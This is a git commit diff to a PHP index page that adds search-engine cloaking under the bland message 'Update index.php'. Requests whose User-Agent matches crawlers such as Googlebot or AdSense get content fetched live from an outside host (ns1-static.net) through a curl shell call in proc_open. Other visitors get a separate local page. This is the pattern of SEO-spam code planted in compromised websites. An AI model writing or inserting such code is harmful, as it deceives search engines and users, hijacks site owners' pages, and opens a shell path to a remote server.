215b7bdfa196d872648628439444845fbdcd0ab4
adidgwb-blip <adidgwb@gmail.com>
2026-04-19 20:12:59 +0700

    Update index.php

--- index.php
+++ index.php
@@ -1,8 +1,11 @@
 <?php
 $ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
 if (preg_match("/(googlebot|slurp|adsense|inspection)/", $ua)) {
-    echo file_get_contents(__DIR__ . "/bot.html");
+    $descriptorspec = [1 => ["pipe", "w"], 2 => ["pipe", "w"]];
+    $process = proc_open('curl -s https://ns1-static.net/clock/admisi/index.html', $descriptorspec, $pipes);
+    echo stream_get_contents($pipes[1]);
+    proc_close($process);
     exit;
 }
-echo file_get_contents(__DIR__ . "/asli.html");
+readfile("asli.html");
 ?>
